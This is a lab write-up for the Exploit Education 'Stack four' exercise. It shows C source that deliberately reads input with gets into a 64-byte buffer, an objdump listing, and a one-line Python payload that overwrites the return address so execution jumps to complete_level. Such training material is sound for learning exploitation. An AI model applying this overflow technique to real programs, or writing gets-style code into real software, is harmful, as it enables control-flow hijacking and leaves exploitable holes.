# Stack four

## Code 

```c 
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}

```

## Explanation

In this level we should exploit the `gets` function to overflow the buffer to reach the return address located in the base pointer, 
to achieve this the payload we inject should be sufficient to also overpass the of padding the compiler.

#### ASM

`objdum` should output something like:
```asm

...
080484e5 <complete_level>:
 80484e5:       55                      push   %ebp
 80484e6:       89 e5                   mov    %esp,%ebp
 80484e8:       83 ec 08                sub    $0x8,%esp
 80484eb:       83 ec 0c                sub    $0xc,%esp
 80484ee:       68 b0 85 04 08          push   $0x80485b0
 80484f3:       e8 28 fe ff ff          call   8048320 <puts@plt>
 80484f8:       83 c4 10                add    $0x10,%esp
 80484fb:       83 ec 0c                sub    $0xc,%esp
 80484fe:       6a 00                   push   $0x0
 8048500:       e8 2b fe ff ff          call   8048330 <exit@plt>

08048505 <start_level>:
 8048505:       55                      push   %ebp
 8048506:       89 e5                   mov    %esp,%ebp
 8048508:       83 ec 58                sub    $0x58,%esp
 804850b:       83 ec 0c                sub    $0xc,%esp
 804850e:       8d 45 b4                lea    -0x4c(%ebp),%eax
 8048511:       50                      push   %eax
 8048512:       e8 f9 fd ff ff          call   8048310 <gets@plt>
 8048517:       83 c4 10                add    $0x10,%esp
 804851a:       8b 45 04                mov    0x4(%ebp),%eax
 804851d:       89 45 f4                mov    %eax,-0xc(%ebp)
 8048520:       83 ec 08                sub    $0x8,%esp
 8048523:       ff 75 f4                pushl  -0xc(%ebp)
 8048526:       68 f3 85 04 08          push   $0x80485f3
 804852b:       e8 d0 fd ff ff          call   8048300 <printf@plt>
 8048530:       83 c4 10                add    $0x10,%esp
 8048533:       90                      nop
 8048534:       c9                      leave
 8048535:       c3                      ret

08048536 <main>:
 8048536:       8d 4c 24 04             lea    0x4(%esp),%ecx
 804853a:       83 e4 f0                and    $0xfffffff0,%esp
 804853d:       ff 71 fc                pushl  -0x4(%ecx)
...
```

Now that we know the address `080484e5` corresponds to the `complete_level()` function, we can begin crafting our payload and pass it through STDIN


## Solution

```bash
python -c "import struct; print('A'*80 + struct.pack('<I',0x080484e5))"| ./stack-four
```

